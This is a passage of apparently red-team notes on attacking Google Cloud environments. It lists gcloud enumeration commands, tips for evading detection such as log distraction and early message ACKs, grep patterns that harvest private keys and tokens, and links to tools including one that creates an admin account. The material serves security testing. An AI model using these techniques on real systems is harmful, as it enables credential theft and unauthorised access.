id="09776c72-9d08-4dd8-bbd2-d02a722b86c4" class="simple-table"><tbody><tr id="4f30ebaf-c060-40de-b0a1-ebf6bfe6a45e"><td id="ufZL" class=""><strong>Command</strong></td><td id="RyLg" class=""><strong>Description</strong></td></tr><tr id="5b7daa90-f108-4b4d-ad20-037440b23381"><td id="ufZL" class=""><code>gcloud logging logs list</code></td><td id="RyLg" class="">Lists log folders in current project</td></tr><tr id="93fb1f48-74b6-461e-a71f-4511b85698c7"><td id="ufZL" class=""><code>gcloud logging read &lt;LOG_FOLDER&gt;</code></td><td id="RyLg" class="">Read contents of specific log folder</td></tr><tr id="49fefea0-a4db-4958-b0a5-5bad50c9dc95"><td id="ufZL" class=""><code>gcloud logging write &lt;LOG_FOLDER&gt; &lt;MESSAGE&gt;</code></td><td id="RyLg" class="">Write arbitrary data to a specific log folder. Can be used for distraction.</td></tr></tbody></table><h1 id="8903c605-0907-49c2-b24c-64f15819a1c4" class=""><strong>Serverless Services</strong></h1><h1 id="eb91525b-df63-4552-a234-20a56f544686" class=""><strong>Cloud Functions</strong></h1><ul id="2ec80f55-233e-4d5d-90fe-908e4fca9196" class="bulleted-list"><li style="list-style-type:disc">AWS Lambda equivalent</li></ul><ul id="d5a7ecfc-686f-49f0-9952-1eb99d6b71c9" class="bulleted-list"><li style="list-style-type:disc">environment variables can contain secrets just like in AWS</li></ul><table id="345a14dc-430e-488a-bea7-b2b27f42aac9" class="simple-table"><tbody><tr id="e9b72fb7-2264-4a0e-80d0-db69849c0f9c"><td id="W}zy" class=""><strong>Command</strong></td><td id="NK&lt;l" class=""><strong>Description</strong></td></tr><tr id="6be90637-cfc4-44cc-a7f6-994a03cc3b15"><td id="W}zy" class=""><code>gcloud functions list</code></td><td id="NK&lt;l" class="">Lists available cloud functions</td></tr><tr id="3fa0f753-78ed-4387-ac01-a40e449d5748"><td id="W}zy" class=""><code>gcloud functions describe &lt;FUNCTION_NAME&gt;</code></td><td id="NK&lt;l" class="">Display function configuration and defined environment variables</td></tr><tr id="4edb9f32-1bf0-46a3-bc9a-d39d4118041f"><td id="W}zy" class=""><code>gcloud functions logs read &lt;FUNCTION_NAME&gt;</code></td><td id="NK&lt;l" class="">Get logs of the function executions</td></tr></tbody></table><h1 id="4b9892b7-b408-413c-98a8-dbaed3f48ba4" class=""><strong>App Engine</strong></h1><ul id="b775f139-d035-483d-9f0c-73d8f79a57d8" class="bulleted-list"><li style="list-style-type:disc">Google App Engine is a serverless cloud computing platform focusing on scalability</li></ul><ul id="e596c671-9c58-4adf-9c70-f3bbf769c8c0" class="bulleted-list"><li style="list-style-type:disc">secrets can be stored in environment variables<table id="10870d7b-0088-423a-a87a-80f27be1dc23" class="simple-table"><tbody><tr id="e17e1876-bc0f-4312-ac6c-09ff96e70c34"><td id="UDv&lt;" class=""><strong>Command</strong></td><td id="[UUS" class=""><strong>Description</strong></td></tr><tr id="103d698d-5847-452f-915e-913c7cc170dc"><td id="UDv&lt;" class=""><code>gcloud app versions list</code></td><td id="[UUS" class="">Lists existing versions for all services in the App Engine server</td></tr><tr id="32c917eb-8a41-47ac-82b8-b22eb3cbfec3"><td id="UDv&lt;" class=""><code>gcloud app describe &lt;APP&gt;</code></td><td id="[UUS" class="">Displays information about a specific app</td></tr></tbody></table></li></ul><h1 id="598741bc-f0a5-4034-bc81-bb0557d504cd" class=""><strong>Cloud Run</strong></h1><ul id="8abcb348-b8bc-44ef-90aa-6e9699ce82d4" class="bulleted-list"><li style="list-style-type:disc">check environment variables for secrets</li></ul><ul id="9437901a-d998-4b17-ab91-d7844a1bc3d1" class="bulleted-list"><li style="list-style-type:disc">opens web server on port 8080 and waits for HTTP GET request<ul id="e732cf31-cbf3-4107-8ae7-8cee8cf75332" class="bulleted-list"><li style="list-style-type:circle">upon receiving such a request, a job is executed which is logged and outputted via an HTTP response</li></ul></li></ul><ul id="a6eb9622-b4de-4f9e-bfd7-24b2d922291a" class="bulleted-list"><li style="list-style-type:disc">jobs run in Kubernetes clusters either fully managed by Google or partially managed through <a href="https://cloud.google.com/anthos">Anthos</a><ul id="4deea875-21e2-4dc5-af48-dfbd48a6b1c8" class="bulleted-list"><li style="list-style-type:circle">can be configured with IAM permissions to control which identities can start the job</li></ul><ul id="01a9f980-28de-4961-bf8f-6d4382a5ab41" class="bulleted-list"><li style="list-style-type:circle">can be configured to be unauthenticated, allowing anyone with the URL to trigger the job and view the log output</li></ul></li></ul><ul id="0d12e75d-8053-46e4-811e-70231cf19b79" class="bulleted-list"><li style="list-style-type:disc">be careful about what those jobs do because it could affect production!</li></ul><table id="1ef759c4-8d64-46f4-b1a3-7b9dacb2d7df" class="simple-table"><tbody><tr id="32199360-cd2c-4d02-9c08-c11871ca5cd5"><td id="|FCS" class=""><strong>Command</strong></td><td id=";tDQ" class=""><strong>Description</strong></td></tr><tr id="04cdff6c-ca06-4185-95f8-7a7653d31999"><td id="|FCS" class=""><code>gcloud run services list --platform=managed --format=json</code> <code>gcloud run services list --platform=gke --format=json</code></td><td id=";tDQ" class="">Lists services across available platforms</td></tr><tr id="94bdf956-b463-4bd5-93c9-1d46c191ec21"><td id="|FCS" class="">1. <code>curl &lt;URL&gt; </code>2. <code>curl -H &quot;Authorization: Bearer $(gcloud auth print-identity-token)&quot; &lt;URL&gt;</code></td><td id=";tDQ" class="">1. Attempt to trigger a job as an unauthenticated user 2. Trigger a job as authenticated user</td></tr></tbody></table><h1 id="11f19d7d-634f-4d5b-b242-eca3ca3ee96e" class=""><strong>AI Platform</strong></h1><ul id="5132a1c4-12bf-4a76-97a8-4640745db9ec" class="bulleted-list"><li style="list-style-type:disc">look for models and jobs</li></ul><table id="19484ed1-1af9-4e1a-b510-825997888148" class="simple-table"><tbody><tr id="6b96dc07-e897-4be8-968b-72194ecc0aa0"><td id="v&gt;lY" class=""><strong>Command</strong></td><td id="sB;A" class=""><strong>Description</strong></td></tr><tr id="ad47678b-b885-4b01-9112-218aa9d57a32"><td id="v&gt;lY" class=""><code>gcloud ai-platforms models list --format=json</code></td><td id="sB;A" class="">Lists models</td></tr><tr id="885ef0d4-ccad-4c33-8c90-e6581a38a5d2"><td id="v&gt;lY" class=""><code>gcloud ai-platform jobs list --format=json</code></td><td id="sB;A" class="">Lists jobs</td></tr></tbody></table><h1 id="d7f21c51-4a40-472a-9113-4c1ad08c30ad" class=""><strong>Cloud Pub/Sub</strong></h1><ul id="dc0405ef-17c3-469c-9214-0db7d43a7e17" class="bulleted-list"><li style="list-style-type:disc">service allowing applications to send messages between each other</li></ul><p id="18776a54-be56-4006-96fd-7a804deb5cb3" class="">Pub/Sub is made up of the following:</p><ol type="1" id="ff006e6a-9b0d-4eac-83cb-3d917e9a2f9a" class="numbered-list" start="1"><li>Topic - logical group of messages</li></ol><ol type="1" id="c89ff390-1b77-4402-9c58-ee2a70aff484" class="numbered-list" start="2"><li>Subscriptions - Allows applications to receive a stream of messages related to a topic, which can be enabled via push notifications (for some Google services), or pull requests (for custom services)</li></ol><ol type="1" id="145028ac-437f-470d-8623-a6ba993af4ee" class="numbered-list" start="3"><li>Messages - data (optionally metadata as well)</li></ol><table id="8c08d0dd-f6d6-4e15-8f79-5343858ada53" class="simple-table"><tbody><tr id="6b1e04c4-6e55-4968-84f2-0a639b1e421b"><td id="YII=" class=""><strong>Command</strong></td><td id="h|Pc" class=""><strong>Description</strong></td></tr><tr id="bacf2007-6ddc-490b-8073-184a5dd65593"><td id="YII=" class=""><code>gcloud pubsub topics list</code></td><td id="h|Pc" class="">Lists topics in project</td></tr><tr id="f6300f55-219d-4282-a9ba-cfc3b0cea839"><td id="YII=" class=""><code>gcloud pubsub subscrpitions list --format=json</code></td><td id="h|Pc" class="">Lists subscriptions for all topics</td></tr><tr id="af5a4e3d-5c56-41d7-8d31-1ae61b9e24ae"><td id="YII=" class=""><code>gcloud pubsub subscriptions pull &lt;SUBSCRIPTION_NAME&gt;</code></td><td id="h|Pc" class="">Pulls one or more messages from a subscriptions</td></tr></tbody></table><ul id="700d0622-92a7-442b-a294-f41be8cd1541" class="bulleted-list"><li style="list-style-type:disc">modification of messages can change behavior of application depending on how the application interacts with the messages</li></ul><ul id="bdec387d-20ad-4f24-b685-c1a20400e7b8" class="bulleted-list"><li style="list-style-type:disc">the pull command could be used to mimic valid applications<ul id="b7b4ab2e-d5b1-492b-9ead-6855423329dc" class="bulleted-list"><li style="list-style-type:circle">some messages can be requested that have not yet been delivered</li></ul><ul id="2aba1fd7-20ac-4173-bb03-66d94594b8ed" class="bulleted-list"><li style="list-style-type:circle">this command should not send an ACK back and should not impact other apps</li></ul></li></ul><ul id="87a3f0d0-6aa8-438b-85a5-d14a5e57a1f1" class="bulleted-list"><li style="list-style-type:disc">an attacker can ACK a message before it is received by the app to avoid some detection</li></ul><ul id="97a9df83-7048-47b1-a10f-7cd682006860" class="bulleted-list"><li style="list-style-type:disc">asking for large sets of data could impact applications (be careful!)</li></ul><h1 id="bab1f910-7945-48c3-b8d0-b5b63f15aa2c" class=""><strong>Cloud Source Repos</strong></h1><ul id="c9d4326f-aee7-4b65-9afc-bc3eb757b930" class="bulleted-list"><li style="list-style-type:disc">designed like Git so</li></ul><ul id="fdff59ca-4dae-403d-9f23-e88a91ac367e" class="bulleted-list"><li style="list-style-type:disc">can contain juicy info</li></ul><table id="27dca7c9-4a2a-4347-9059-073978948193" class="simple-table"><tbody><tr id="3c3840ee-a4d3-4a00-ac7e-b5d98e3dd5c4"><td id="G`o|" class=""><strong>Command</strong></td><td id="w\G:" class=""><strong>Description</strong></td></tr><tr id="6a062089-9385-4933-87ae-0b02cccf97e4"><td id="G`o|" class=""><code>gcloud source repos list</code></td><td id="w\G:" class="">Enumerate available repos</td></tr><tr id="eabe1ab8-cf95-4ff9-bc06-6742721f5736"><td id="G`o|" class=""><code>gcloud source repos clone &lt;REPO_NAME&gt;</code></td><td id="w\G:" class="">Clone a repo</td></tr></tbody></table><h1 id="ba9144af-0118-4697-8485-f62b0302135b" class=""><strong>Cloud Filestore</strong></h1><ul id="efec0e1a-bd35-406b-8a42-1a635c0f9996" class="bulleted-list"><li style="list-style-type:disc">database designed for storing small documents</li></ul><ul id="2b1c4a5b-dbbe-4c50-aafb-ede27333eb3c" class="bulleted-list"><li style="list-style-type:disc">like AWS DynamoDB</li></ul><ul id="863a08dc-52c0-4193-b93d-46ace48969cd" class="bulleted-list"><li style="list-style-type:disc">filestores can be mounted</li></ul><p id="b92f5b2d-d811-4152-8ed1-ec7642ad4bad" class=""><strong>List Filestore Instances</strong></p><p id="2b6c09d9-3dee-4a5e-be86-ccff1ca67141" class=""><code>gcloud filestore instances list --format=json</code></p><h1 id="366a7ade-8464-460d-a394-cb781e3de627" class=""><strong>Kubernetes</strong></h1><ul id="aac0d928-b4dd-48f3-a5e6-fd92721f10ac" class="bulleted-list"><li style="list-style-type:disc">container service for scaling, management, and software deployment</li></ul><table id="65fee0a6-f110-4779-8b47-53e3d9187b78" class="simple-table"><tbody><tr id="5c5e712a-5d1a-4aef-8448-fc337f3dd00e"><td id="=lvT" class=""><strong>Command</strong></td><td id="K]\&lt;" class=""><strong>Description</strong></td></tr><tr id="a94e4a97-a3ea-4565-ad9d-a205cf7be248"><td id="=lvT" class=""><code>gcloud container clusters list</code></td><td id="K]\&lt;" class="">List container clusters in current project</td></tr><tr id="680b0861-0d64-4a89-80ca-6d427226b4ac"><td id="=lvT" class=""><code>gcloud container clusters get-credentials &lt;CLUSTER_NAME&gt; --region &lt;REGION&gt;</code></td><td id="K]\&lt;" class="">Authenticates your <code>~/..kube/config</code> file to include the cluster so that you can use <code>kubectl</code>.</td></tr><tr id="d8231677-f4a8-4222-88a4-ba1d64fa5c3d"><td id="=lvT" class=""><code>kubectl cluster-info</code></td><td id="K]\&lt;" class="">Get information about the cluster.</td></tr></tbody></table><p id="ae9b86a4-7826-4c1b-9786-112c252a4f9e" class="">Kubectl cheat sheet: <a href="https://kubernetes.io/docs/reference/kubectl/cheatsheet/">https://kubernetes.io/docs/reference/kubectl/cheatsheet/</a></p><h1 id="ed5cef77-66cd-4a3b-a096-67fccd27c077" class=""><strong>Secrets Management</strong></h1><ul id="fbb6156e-bf29-4d1e-9b13-a53c2c4f7089" class="bulleted-list"><li style="list-style-type:disc">stores passwords, API keys, certificates, etc.</li></ul><table id="5b83dc92-f0e6-4049-a59c-9b6139f8232b" class="simple-table"><tbody><tr id="64154e66-c802-4e59-a37f-5fcc7ae4e762"><td id="gXbd" class=""><strong>Command</strong></td><td id="Pu@V" class=""><strong>Description</strong></td></tr><tr id="d61168e6-0e14-4655-950e-55b975d43004"><td id="gXbd" class=""><code>gcloud secrets list</code></td><td id="Pu@V" class="">Lists secrets in vault</td></tr><tr id="d19e390a-92aa-4d9e-aaa1-a8970479c362"><td id="gXbd" class=""><code>gcloud secrets describe &lt;SECRET&gt;</code></td><td id="Pu@V" class="">Get the value of the secret.</td></tr></tbody></table><h1 id="93af5d9d-ebbc-43e6-b795-094ded2a3265" class=""><strong>Local System Secrets</strong></h1><ul id="78f501cc-9597-45e9-8e69-0ace60f45454" class="bulleted-list"><li style="list-style-type:disc">with internal access to a system search temporary directories, history files, environment variables, scripts, etc.</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="cd7d73ae-e5c9-4953-a514-7138443882b6" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">TARGET_DIR=&quot;/path/to/whatever&quot;
+
+# Service account keys
+grep -Pzr &quot;(?s){[^{}]*?service_account[^{}]*?private_key.*?}&quot; \
+    &quot;$TARGET_DIR&quot;
+
+# Legacy GCP creds
+grep -Pzr &quot;(?s){[^{}]*?client_id[^{}]*?client_secret.*?}&quot; \
+    &quot;$TARGET_DIR&quot;
+
+# Google API keys
+grep -Pr &quot;AIza[a-zA-Z0-9\\-_]{35}&quot; \
+    &quot;$TARGET_DIR&quot;
+
+# Google OAuth tokens
+grep -Pr &quot;ya29\.[a-zA-Z0-9_-]{100,200}&quot; \
+    &quot;$TARGET_DIR&quot;
+
+# Generic SSH keys
+grep -Pzr &quot;(?s)-----BEGIN[ A-Z]*?PRIVATE KEY[a-zA-Z0-9/\+=\n-]*?END[ A-Z]*?PRIVATE KEY-----&quot; \
+    &quot;$TARGET_DIR&quot;
+
+# Signed storage URLs
+grep -Pir &quot;storage.googleapis.com.*?Goog-Signature=[a-f0-9]+&quot; \
+    &quot;$TARGET_DIR&quot;
+
+# Signed policy documents in HTML
+grep -Pzr &#x27;(?s)&lt;form action.*?googleapis.com.*?name=&quot;signature&quot; value=&quot;.*?&quot;&gt;&#x27; \
+    &quot;$TARGET_DIR&quot;</code></pre><h1 id="42cede20-590d-4d5f-b92e-a26b382a3783" class=""><strong>Networking</strong></h1><h1 id="4f21920b-7092-4915-9ee2-82e0bc521268" class=""><strong>Firewall</strong></h1><ul id="6eca365d-fd15-47ac-aefc-e0b9d38de6b5" class="bulleted-list"><li style="list-style-type:disc">every project is given a default VPC which contains the following rules for all instances:<ol type="1" id="75547e6f-4cd4-4fbf-94a3-02e308aa0c67" class="numbered-list" start="1"><li><code>default-allow-internal</code> - allows all traffic from other instances on the same network</li></ol><ol type="1" id="f7995db8-a038-4ff3-af04-6239d876ad21" class="numbered-list" start="2"><li><code>default-allow-ssh</code> - allows port 22 traffic from everywhere</li></ol><ol type="1" id="7cfc7a4f-dcd0-41fe-920d-bc591d2b3eb5" class="numbered-list" start="3"><li><code>default-allow-rdp</code> - allows port 3389 traffic from everywhere</li></ol><ol type="1" id="36a2cbb0-edd7-47b5-a3ab-ccbc5642fdfe" class="numbered-list" start="4"><li><code>default-allow-icmp</code> - allows ping from everywhere</li></ol></li></ul><h1 id="85a062bd-54e8-462c-b644-1b478d859746" class=""><strong>Enumeration</strong></h1><p id="f6a61250-b948-4a10-b4e3-24218bddf975" class="">View all subnets in current project:</p><p id="8e5f8339-c279-45bb-a574-ac08d6bafb0e" class=""><code>gcloud compute networks subnets list</code></p><p id="1caf8fda-5bb5-4d4a-9b51-e6aff540effb" class="">View all internal/external IP addresses in project:</p><p id="4ac05eac-ece1-4442-ab74-2d1d8871b0bc" class=""><code>gcloud compute instances list</code></p><p id="f4fff1ba-7646-4401-a252-9f694e4e1f94" class="">View open ports of all instances</p><ul id="253642cd-3336-4299-8d97-aafdcb3c8966" class="bulleted-list"><li style="list-style-type:disc"><strong>Running nmap from within an instance can trigger an alert</strong><ul id="c7cf8bde-1897-46ca-82ca-79ebadba7555" class="bulleted-list"><li style="list-style-type:circle">likelihood of trigger increases if scanning public IP addresses outside of current project</li></ul></li></ul><ul id="0197e8ba-808e-4455-b376-d766b154cd57" class="bulleted-list"><li style="list-style-type:disc">there may be an insecure application that can be exploited to achieve elevated access</li></ul><ul id="e11148df-ef66-4ca8-9e49-c6aaf723b591" class="bulleted-list"><li style="list-style-type:disc">port enumeration should be interpreted by viewing firewall rules, network tags, service accounts, and instances within a VPC (see <a href="https://gitlab.com/gitlab-com/gl-security/threatmanagement/redteam/redteam-public/gcp_firewall_enum">gcp_firewall_enum</a>)</li></ul><h1 id="929c8620-61bf-4a2c-8df1-daa6dab9aa70" class=""><strong>G Suite</strong></h1><ul id="63ab00fb-ce8e-4bb3-8a7b-228e0d9e7f80" class="bulleted-list"><li style="list-style-type:disc">uses completely different API from Google Cloud</li></ul><ul id="5e292bb3-4910-4b37-b174-19bc1a747992" class="bulleted-list"><li style="list-style-type:disc">GCP service accounts can access G Suite data using domain-wide delegation<ul id="6ac66b33-7c6f-40b0-9a25-83d738cec829" class="bulleted-list"><li style="list-style-type:circle">can be viewed in the web interface via IAM → Service Accounts</li></ul></li></ul><h1 id="f9f992a3-adf0-4754-873c-69e9eff5171f" class=""><strong>Authenticating to G Suite</strong></h1><ul id="edc1b102-d389-498c-8cce-c06601a1687f" class="bulleted-list"><li style="list-style-type:disc">need exported service accounts credentials in JSON format</li></ul><ul id="3f229abc-211b-4aba-b30b-00ef2fbc885f" class="bulleted-list"><li style="list-style-type:disc">service accounts cannot authenticate to G Suite, and therefore you need to impersonate valid G Suite users<ul id="813228e0-3f5d-4e64-8c8c-f0cd62e86770" class="bulleted-list"><li style="list-style-type:circle">(see <a href="https://gitlab.com/gitlab-com/gl-security/threatmanagement/redteam/redteam-public/gcp_misc/-/blob/master/gcp_delegation.py">gcp_delegation</a>)</li></ul></li></ul><h1 id="7966d863-24b7-4867-bbda-2b87d9ebc38a" class=""><strong>Tools</strong></h1><p id="dc0c33b1-03ca-4ccd-8972-be98f353c49b" class=""><a href="https://gitlab.com/gitlab-com/gl-security/threatmanagement/redteam/redteam-public/gcp_firewall_enum">gcp_firewall_enum</a></p><ul id="67c26217-a706-42ad-866b-e66c74a596cd" class="bulleted-list"><li style="list-style-type:disc">port scans for compute instances exposed to the internet</li></ul><p id="9a22179b-8d0f-4924-a017-ca6ceb0909e5" class=""><a href="https://gitlab.com/gitlab-com/gl-security/threatmanagement/redteam/redteam-public/gcp_enum">gcp_enum</a></p><ul id="ba6a1348-cd00-4b87-aacc-562406f3adbe" class="bulleted-list"><li style="list-style-type:disc">script full of enumeration commands</li></ul><p id="55efa92d-e686-4bf4-9bcb-f6bfc1e7f17f" class=""><a href="https://gitlab.com/gitlab-com/gl-security/threatmanagement/redteam/redteam-public/gcp_misc">gcp_misc</a></p><ul id="32ac8abc-521e-4a6e-9492-55db23766966" class="bulleted-list"><li style="list-style-type:disc">a collection of tools for attacking GCP environments</li></ul><ul id="bb08c7e8-7785-4230-9248-d40608d78086" class="bulleted-list"><li style="list-style-type:disc">contains <a href="https://gitlab.com/gitlab-com/gl-security/threatmanagement/redteam/redteam-public/gcp_misc/-/blob/master/gcp_delegation.py">gcp_delegation</a> for listing user directory and creating a new admin account</li></ul></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
